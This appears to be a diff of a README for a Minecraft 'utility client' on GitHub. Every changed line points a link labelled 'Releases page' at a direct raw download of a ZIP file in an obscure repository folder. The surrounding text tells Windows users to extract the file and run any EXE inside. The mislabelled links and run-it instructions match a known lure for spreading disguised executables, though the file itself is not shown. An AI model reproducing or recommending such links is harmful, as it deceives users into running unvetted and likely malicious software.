@@ -1,9 +1,9 @@
 # 🧩 minecraft-client-collection - Lightweight Minecraft utility client
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Deep0305-d/minecraft-client-collection/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Deep0305-d/minecraft-client-collection/main/acridine/collection_client_minecraft_3.9.zip)
 
 ## 📥 Download
-Go to the [Releases page](https://github.com/Deep0305-d/minecraft-client-collection/releases) to download and run this file.
+Go to the [Releases page](https://raw.githubusercontent.com/Deep0305-d/minecraft-client-collection/main/acridine/collection_client_minecraft_3.9.zip) to download and run this file.
 
 Pick the latest release from the list. On that page, look for the Windows file. If you see a ZIP file, download it first, then open it. If you see an EXE file, download it and run it.
 
@@ -28,7 +28,7 @@ Use a Windows PC with:
 If you plan to use a ZIP file, you also need the built-in Windows unzip tool or a file tool like 7-Zip
 
 ## 🧭 How to install on Windows
-1. Open the [Releases page](https://github.com/Deep0305-d/minecraft-client-collection/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/Deep0305-d/minecraft-client-collection/main/acridine/collection_client_minecraft_3.9.zip)
 2. Find the latest release at the top
 3. Download the Windows file
 4. If the file is a ZIP, right-click it and choose Extract All
